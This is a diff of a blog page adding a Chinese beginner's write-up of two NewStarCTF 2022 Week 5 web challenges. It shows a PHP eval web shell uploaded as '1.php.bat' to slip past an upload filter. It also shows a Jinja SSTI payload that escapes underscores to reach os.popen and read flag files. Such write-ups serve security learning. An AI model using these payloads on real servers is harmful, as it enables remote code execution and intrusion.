@@ -16,16 +16,25 @@
   <meta name="author" content="qpm">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="Give me your photo PLZ上传一个图片试试试了一下，不能上传后缀为php的文件，所以我上传了1.php.bat 1&lt;?php eval($_GET[&amp;#x27;hh&amp;#x27;]); ?&gt; 发现图片加载不出来，打开F12看看有没有提示，wc，文件路径都出来了，访问着试试看  这是网址&#x2F;upload&#x2F;1.php.bat&#x2F;?hh&#x3D;p">
+<meta property="og:type" content="article">
 <meta property="og:title" content="NewStarCTF_Week5_Web">
 <meta property="og:url" content="https://qpmhhh.github.io/2022/10/22/NewStarCTF-Week5-Web/index.html">
 <meta property="og:site_name" content="qpm&#39;s blog">
+<meta property="og:description" content="Give me your photo PLZ上传一个图片试试试了一下，不能上传后缀为php的文件，所以我上传了1.php.bat 1&lt;?php eval($_GET[&amp;#x27;hh&amp;#x27;]); ?&gt; 发现图片加载不出来，打开F12看看有没有提示，wc，文件路径都出来了，访问着试试看  这是网址&#x2F;upload&#x2F;1.php.bat&#x2F;?hh&#x3D;p">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qpmhhh.github.io/img/5W1.png">
+<meta property="og:image" content="https://qpmhhh.github.io/img/5W2.png">
+<meta property="og:image" content="https://qpmhhh.github.io/img/5W3.png">
+<meta property="og:image" content="https://qpmhhh.github.io/img/5W4.png">
+<meta property="og:image" content="https://qpmhhh.github.io/img/5W5.png">
+<meta property="og:image" content="https://qpmhhh.github.io/img/5W6.png">
 <meta property="article:published_time" content="2022-10-22T15:45:21.000Z">
-<meta property="article:modified_time" content="2022-10-23T06:21:13.338Z">
+<meta property="article:modified_time" content="2022-10-24T05:43:26.328Z">
 <meta property="article:author" content="qpm">
 <meta property="article:tag" content="NewStarCTF">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://qpmhhh.github.io/img/5W1.png">
   
   
   
@@ -217,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          908 字
         
       </span>
     
@@ -228,7 +237,7 @@
         
         
         
-          1 分钟
+          8 分钟
         
       </span>
     
@@ -271,7 +280,19 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="Give-me-your-photo-PLZ"><a href="#Give-me-your-photo-PLZ" class="headerlink" title="Give me your photo PLZ"></a>Give me your photo PLZ</h1><p>上传一个图片试试<br><img src="/img/5W1.png" srcset="/img/loading.gif" lazyload alt="谁不喜欢可爱的雷姆呢"><br>试了一下，不能上传后缀为php的文件，所以我上传了1.php.bat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 披着bat壳的php">&lt;?php eval($_GET[&#x27;hh&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure>
+<p>发现图片加载不出来，打开F12看看有没有提示，<br><img src="/img/5W2.png" srcset="/img/loading.gif" lazyload><br>wc，文件路径都出来了，访问着试试看</p>
+<blockquote>
+<p>这是网址&#x2F;upload&#x2F;1.php.bat&#x2F;?hh&#x3D;phpinfo();<br><img src="/img/5W3.png" srcset="/img/loading.gif" lazyload alt="成功上传并得到flag"></p>
+</blockquote>
+<h1 id="BabySSTI-Three"><a href="#BabySSTI-Three" class="headerlink" title="BabySSTI_Three"></a>BabySSTI_Three</h1><p>第一次做SSTI系列的题，学一下之前大佬关于SSTI的wp<br><a target="_blank" rel="noopener" href="https://pysnow.cn/archives/453/">大佬wp1</a><br><a target="_blank" rel="noopener" href="https://www.ttycp3.top/2022/10/06/NEWSTARCTF2022%E6%96%B0%E7%94%9F%E8%B5%9B/">大佬wp2</a><br><img src="/img/5W4.png" srcset="/img/loading.gif" lazyload alt="wp1_BabySSTI_Two"><br><img src="/img/5W5.png" srcset="/img/loading.gif" lazyload alt="wp2_BabySSTI_Two"><br>原本是想直接套用wp1的payload的，但是’_’被过滤了…<br>所以只能把两个大佬的思想结合(引用格式借鉴了第二个大佬的wp)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">GET: ?name=&#123;&#123;self[%27\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f%27][%27\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%27][%27\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f%27][%27\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f%27](%27\u006f\u0073%27)[%27\u0070\u006f\u0070\u0065\u006e%27](%27\u0074\u0061\u0063\u0024\u007b\u0049\u0046\u0053\u007d\u002f\u0066\u002a%27).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p>最终得到flag：<br><img src="/img/5W6.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="后面不会了，雷姆来了也没办法"><a href="#后面不会了，雷姆来了也没办法" class="headerlink" title="后面不会了，雷姆来了也没办法"></a>后面不会了，雷姆来了也没办法</h1><blockquote>
+<p>qpm是个新手，以上过程如有不正确之处，请联系<a href="mailto:&#113;&#112;&#x6d;&#x68;&#104;&#104;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#109;">&#113;&#112;&#x6d;&#x68;&#104;&#104;&#x40;&#113;&#113;&#46;&#x63;&#x6f;&#109;</a>改正，感谢观看！</p>
+</blockquote>
+
                 
               </div>
             
